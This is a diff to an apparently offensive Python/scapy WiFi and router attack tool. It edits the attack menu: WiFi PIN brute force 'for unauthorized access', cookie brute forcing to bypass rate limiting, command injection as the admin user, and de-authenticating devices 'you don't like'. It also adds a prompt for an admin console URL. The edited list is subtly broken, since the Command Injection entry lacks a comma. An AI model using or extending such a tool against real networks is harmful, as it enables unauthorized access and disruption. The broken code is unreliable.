@@ -9,9 +9,11 @@ from scapy.all import *
 from scapy.layers.dot11 import *
 
 ATTACKS = [
-    ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access"),
-    ("De-Auth",   "Identify other devices on the network and attempt to de-authenticate the ones you don't like"),
-    ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies")
+    ("PIN Brute", "Perform a brute force attack on the WiFi Pin for unauthorized access."),
+    ("Check Admin Status",   "Identify if the Admin is actively logged in and editing the configuration settings."),
+    ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies."),
+    ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)")
+    ("De-Auth",   "Identify other devices on the network and attempt to de-authenticate the ones you don't like."),
 ]
 
 def check_admin() -> None:
@@ -299,7 +301,8 @@ def main() -> None:
                     case 1:
                         ssid_brute(target["SSID"])
                     case 2:
-                        print("\n[!] Alternate Attack Hook Triggered!\n")
+                        url = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                        query_admin_status(url)
                     case 3:
                         password_list = "rockyou.txt"
                         url = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
